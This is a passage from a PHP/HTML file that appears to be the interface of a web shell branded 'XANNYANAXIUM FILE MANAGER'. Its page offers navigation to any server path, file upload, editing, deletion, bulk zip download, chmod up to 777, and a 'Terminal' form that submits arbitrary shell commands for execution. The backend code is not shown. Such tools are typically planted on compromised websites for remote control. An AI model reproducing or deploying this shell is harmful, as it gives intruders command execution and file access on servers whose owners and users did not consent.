            document.getElementById('owner_read').checked = binary[0] === '1';
            document.getElementById('owner_write').checked = binary[1] === '1';
            document.getElementById('owner_execute').checked = binary[2] === '1';
            
            // Group permissions
            document.getElementById('group_read').checked = binary[3] === '1';
            document.getElementById('group_write').checked = binary[4] === '1';
            document.getElementById('group_execute').checked = binary[5] === '1';
            
            // Other permissions
            document.getElementById('other_read').checked = binary[6] === '1';
            document.getElementById('other_write').checked = binary[7] === '1';
            document.getElementById('other_execute').checked = binary[8] === '1';
        }
        
        function updateChmodFromCheckboxes() {
            var binary = '';
            
            // Owner permissions
            binary += document.getElementById('owner_read').checked ? '1' : '0';
            binary += document.getElementById('owner_write').checked ? '1' : '0';
            binary += document.getElementById('owner_execute').checked ? '1' : '0';
            
            // Group permissions
            binary += document.getElementById('group_read').checked ? '1' : '0';
            binary += document.getElementById('group_write').checked ? '1' : '0';
            binary += document.getElementById('group_execute').checked ? '1' : '0';
            
            // Other permissions
            binary += document.getElementById('other_read').checked ? '1' : '0';
            binary += document.getElementById('other_write').checked ? '1' : '0';
            binary += document.getElementById('other_execute').checked ? '1' : '0';
            
            // Convert binary to octal
            var octal = parseInt(binary, 2).toString(8).padStart(3, '0');
            document.getElementById('chmodOctal').value = octal;
        }
        
        function setPresetChmod(preset) {
            updateChmodDisplay(preset);
        }
        
        // Close modal when clicking outside
        window.onclick = function(event) {
            var modal = document.getElementById('chmodModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }
    </script>
</head>
<body>
<div class="container">
    <h1>XANNYANAXIUM FILE MANAGER</h1>
    <p class="subtitle">Navigate and manage your files</p>

    <?php if ($notification): ?>
        <div class="alert alert-success"><?= htmlentities($notification) ?></div>
    <?php endif; ?>
    
    <?php if ($errorMsg): ?>
        <div class="alert alert-danger"><?= htmlentities($errorMsg) ?></div>
    <?php endif; ?>

    <div class="section">
        <div class="section-title">Current Directory</div>
        <form method="post" class="input-group">
            <input type="text" name="navigate" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path...">
            <button class="btn" type="submit">Navigate</button>
        </form>
    </div>

    <div class="grid-2">
        <div class="section">
            <div class="section-title">Upload File</div>
            <div class="upload-tabs">
                <div id="standard-tab" class="upload-tab active" onclick="switchUploadTab('standard')">Standard Upload</div>
                <div id="advanced-tab" class="upload-tab" onclick="switchUploadTab('advanced')">Advanced Upload</div>
            </div>
            
            <div id="standard-panel" class="upload-panel active">
                <form method="post" enctype="multipart/form-data">
                    <div class="input-group">
                        <input type="file" name="file_upload">
                        <button class="btn btn-primary" type="submit">Upload</button>
                    </div>
                </form>
            </div>
            
            <div id="advanced-panel" class="upload-panel">
                <div class="input-group">
                    <input type="file" id="upload_files" name="upload_files" multiple="multiple">
                    <button class="btn btn-primary" onclick="uploadFile(); return false;">Upload</button>
                </div>
                <p style="margin-top: 8px; font-size: 12px;">Status: <span id="upload_status" style="color:#9ca3af;">No file selected</span></p>
            </div>
        </div>

        <div class="section">
            <div class="section-title">Create New</div>
            <form method="post" class="input-group">
                <input type="text" name="create_file" placeholder="New file name...">
                <button class="btn btn-create" type="submit">File</button>
            </form>
            <form method="post" class="input-group">
                <input type="text" name="create_folder" placeholder="New folder name...">
                <button class="btn btn-create" type="submit">Folder</button>
            </form>
        </div>
    </div>

    <?php if ($fileToView && $viewContent !== null): ?>
        <div class="section">
            <div class="section-title">Viewing: <?= htmlentities($fileToView) ?></div>
            <textarea readonly><?= htmlentities($viewContent) ?></textarea>
        </div>
    <?php endif; ?>

    <?php if ($fileToEdit !== null): ?>
        <div class="section">
            <div class="section-title">Editing: <?= htmlentities($fileToEdit) ?></div>
            <form method="post">
                <input type="hidden" name="file_to_edit" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="file_content" style="height: 500px;"><?= htmlentities($fileContent) ?></textarea>
                <div style="margin-top: 12px;">
                    <button class="btn btn-primary" type="submit">Save Changes</button>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <?php if ($commandAvailable): ?>
    <div class="section">
        <div class="section-title">Terminal</div>
        <form method="post" class="input-group">
            <input type="text" name="terminal_command" placeholder="Enter command...">
            <button class="btn btn-create" type="submit">Execute</button>
        </form>
        <?php if ($commandResult): ?>
            <div class="terminal-output" style="margin-top: 12px;"><?= htmlentities($commandResult) ?></div>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <form method="post">
        <button name="navigate" value="<?= dirname($currentDirectory) ?>" class="btn up-btn">← Parent Directory</button>
    </form>

    <form method="post" id="file-form">
        <div id="bulk-actions" class="bulk-actions" style="display: none;">
            <span class="bulk-actions-text" id="selected-count">0 item(s) selected</span>
            <button type="submit" name="bulk_download" class="btn btn-sm" onclick="return confirm('Download selected items as zip?')">Download Selected</button>
            <button type="submit" name="bulk_delete" class="btn btn-danger btn-sm" onclick="return confirm('Delete all selected items?')">Delete Selected</button>
        </div>

    <table>
        <thead>
            <tr>
                <th style="width: 40px;">
                    <input type="checkbox" onclick="toggleSelectAll(this)">
                </th>
                <th style="width: auto;">Name</th>
                <th style="width: 120px;">Type</th>
                <th style="width: 100px; text-align: right;">Size</th>
                <th style="width: 160px; text-align: center;">Modified</th>
                <th style="width: 80px; text-align: center;">Permission</th>
                <th style="width: auto; text-align: right;">Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . '/' . $item;
            
            // --- FIX FOR STAT ERRORS ---
            // Use the validatePath function to ensure the file/directory exists
            // before trying to get its stats. This prevents warnings for broken
            // symlinks or files deleted during execution.
            $realPath = validatePath($fullPath);

            if ($realPath !== false) {
                $isDirectory = @is_dir($realPath);
                $canWrite = @is_writable($realPath);
                $fileSize = $isDirectory ? 0 : @filesize($realPath);
                $fileModTime = @filemtime($realPath);
                $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
            } else {
                // Set default values if the path is invalid (e.g., a broken symlink)
                $isDirectory = @is_dir($fullPath); // is_dir() will be false for broken links
                $canWrite = false;
                $fileSize = 0;
                $fileModTime = 0;
                $filePerms = '????'; // Indicate unreadable permissions
            }
            
            $safeItemName = preg_replace('/[^a-zA-Z0-9]/', '_', $item);
?>
            <tr>
                <td>
                    <input type="checkbox" name="selected_items[]" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()">
                </td>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        <form method="post" class="rename-form" style="margin: 0;">
                            <input type="hidden" name="old_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="new_name" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-primary btn-sm" type="submit">Save</button>
                        </form>
                    <?php elseif ($itemToChmod === $item): ?>
                        <form method="post" class="chmod-form" style="margin: 0;">
                            <input type="hidden" name="chmod_item" value="<?= htmlentities($item) ?>">
                            <input type="text" name="chmod_value" value="<?= $filePerms ?>" maxlength="3" placeholder="755">
                            <button class="btn btn-primary btn-sm" type="submit">Set</button>
                            <button class="btn btn-sm" type="button" onclick="location.reload();">Cancel</button>
                        </form>
                    <?php else: ?>
                        <span class="file-icon"><?= $isDirectory ? '/' : '' ?></span>
                        <?php if ($isDirectory): ?>
                            <a href="#" class="file-name" onclick="document.getElementById('navigate-form-<?= md5($item) ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                            <form id="navigate-form-<?= md5($item) ?>" method="post" style="display: none;">
                                <input type="hidden" name="navigate" value="<?= $fullPath ?>">
                            </form>
                        <?php else: ?>
                            <a href="#" class="file-name" onclick="document.getElementById('view-form-<?= md5($item) ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                            <form id="view-form-<?= md5($item) ?>" method="post" style="display: none;">
                                <input type="hidden" name="view" value="<?= $item ?>">
                            </form>
                        <?php endif; ?>
                    <?php endif; ?>
                </td>
                <td>
                    <!-- FIX FOR PHP VERSION COMPATIBILITY -->
                    <span class="file-type"><?= $isDirectory ? 'Directory' : (getFileExtension($item) ?: 'File') ?></span>
                </td>
                <td>
                    <span class="file-size"><?= $isDirectory ? '&mdash;' : formatFileSize($fileSize) ?></span>
                </td>
                <td>
                    <span class="file-date"><?= date('Y-m-d H:i:s', $fileModTime) ?></span>
                </td>
                <td style="text-align: center;">
                    <span class="<?= $canWrite ? 'writable' : 'readonly' ?>"><?= $filePerms ?></span>
                </td>
                <td>
                    <div class="action-buttons">
                        <?php if (!$isDirectory): ?>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="edit" value="<?= htmlentities($item) ?>">
                                <button type="submit" class="btn btn-sm">Edit</button>
                            </form>
                        <?php endif; ?>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="rename" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-sm">Rename</button>
                        </form>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="chmod" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-sm">Chmod</button>
                            <input type="hidden" id="currentPerms_<?= $safeItemName ?>" value="<?= $filePerms ?>">
                        </form>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="download" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-sm">Download</button>
                        </form>
                        <form method="post" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this item?');">
                            <input type="hidden" name="remove" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-danger btn-sm">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    </form>
</div>

<!-- Chmod Modal -->
<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span class="modal-title">Change Permissions</span>
            <span class="close" onclick="closeChmodModal()">&times;</span>
        </div>
        <form method="post">
            <input type="hidden" id="chmodItem" name="chmod_item" value="">
            <div class="chmod-options">
                <div class="chmod-group">
                    <label>Owner</label>
                    <div>
                        <input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R
                        <input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W
                        <input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X
                    </div>
                </div>
                <div class="chmod-group">
                    <label>Group</label>
                    <div>
                        <input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R
                        <input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W
                        <input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X
                    </div>
                </div>
                <div class="chmod-group">
                    <label>Other</label>
                    <div>
                        <input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R
                        <input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W
                        <input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X
                    </div>
                </div>
                <div class="chmod-group">
                    <label>Octal</label>
                    <div>
                        <input type="text" id="chmodOctal" name="chmod_value" maxlength="3" style="width: 50px; text-align: center;">
                    </div>
                </div>
            </div>
            <div style="margin-bottom: 15px;">
                <button type="button" class="btn btn-sm" onclick="setPresetChmod('755')">755 (Default)</button>
                <button type="button" class="btn btn-sm" onclick="setPresetChmod('644')">644 (File)</button>
                <button type="button" class="btn btn-sm" onclick="setPresetChmod('777')">777 (All)</button>
            </div>
            <div>
                <button type="submit" class="btn btn-primary">Apply Changes</button>
                <button type="button" class="btn" onclick="closeChmodModal()">Cancel</button>
            </div>
        </form>
    </div>
</div>

</body>
</html>